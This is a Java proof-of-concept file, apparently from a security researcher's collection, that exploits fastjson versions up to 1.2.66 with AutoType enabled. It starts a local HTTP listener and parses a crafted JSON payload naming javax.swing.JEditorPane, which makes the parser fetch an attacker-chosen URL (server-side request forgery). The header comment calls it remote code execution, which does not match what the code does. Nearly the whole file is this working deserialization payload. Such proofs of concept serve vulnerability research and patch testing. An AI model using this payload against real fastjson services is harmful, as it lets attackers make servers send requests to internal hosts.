package com.threedr3am.bug.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.HTTPServer;

/**
 * fastjson <= 1.2.66 RCE，需要开启AutoType（JRE自带依赖）
 *
 * @author threedr3am
 */
public class JREJeditorPaneSSRFPoc {

  static {
    HTTPServer.PORT = 23234;
    HTTPServer.run(null);
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String payload = "{\"@type\":\"javax.swing.JEditorPane\",\"page\": \"http://127.0.0.1:23234?a=1&b=22222\"}";
    try {
      JSON.parse(payload);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}